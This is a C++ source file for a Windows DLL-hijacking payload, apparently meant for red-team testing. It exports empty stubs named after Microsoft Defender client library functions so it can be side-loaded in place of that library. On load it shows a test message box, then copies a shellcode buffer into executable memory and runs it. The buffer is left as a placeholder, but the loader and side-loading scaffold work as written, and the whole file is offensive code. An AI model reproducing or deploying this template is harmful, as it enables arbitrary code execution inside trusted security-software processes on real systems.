#include <windows.h>

#pragma comment (lib, "User32.lib")

unsigned char buf[] = {
    // shellcode here
};

void ExecuteShellcode(unsigned char* shellcode, unsigned int shellcodeSize) {
    void* execBuffer = VirtualAlloc(nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(execBuffer, shellcode, shellcodeSize);
    ((void(*)())execBuffer)();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            MessageBoxW(0, L"DLL HIJACKING TESTING", L"DLL Hijacked", 0);
            ExecuteShellcode(buf, sizeof(buf));
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void MpConfigClose(){}
extern "C" __declspec(dllexport) void MpConfigGetValueAlloc(){}
extern "C" __declspec(dllexport) void MpHandleClose(){}
extern "C" __declspec(dllexport) void MpNotificationRegister(){}
extern "C" __declspec(dllexport) void MpManagerOpen(){}
extern "C" __declspec(dllexport) void MpFreeMemory(){}
extern "C" __declspec(dllexport) void MpConfigUninitialize(){}
extern "C" __declspec(dllexport) void MpConfigOpen(){}
extern "C" __declspec(dllexport) void MpConfigInitialize(){}
extern "C" __declspec(dllexport) void MpClientUtilExportFunctions(){}
extern "C" __declspec(dllexport) void MpUtilsExportFunctions(){}
